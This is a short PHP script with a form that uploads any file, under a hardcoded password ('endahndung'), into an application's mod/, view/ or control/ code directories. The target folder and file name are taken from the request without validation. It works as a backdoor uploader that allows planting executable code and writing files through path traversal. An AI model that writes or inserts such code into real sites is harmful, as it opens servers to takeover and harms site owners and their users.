<?php
    
    if (!empty($_POST['go']))
    {
        if ($_POST['sandi']=="endahndung")
        {
            $nm_berkas=$_FILES['berkas']['name'];
            $tmp_berkas = $_FILES['berkas']['tmp_name'];
            $d=$_POST['folder'];

            move_uploaded_file($tmp_berkas,$d.$nm_berkas);

            echo '<script>window.alert("File Uploaded !");</script>';
        }else
        {
            echo '<script>window.alert("File Cannot Upload");</script>';
        }
        
        
    }
    
?>

<form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="berkas" id="">
    <select name="folder" id="">
        <option value="mod/">mod/</option>
        <option value="view/">view/</option>
        <option value="control/">control/</option>
    </select>
    <input type="password" name="sandi" id="">
    <input type="submit" name="go" value="GO">
</form>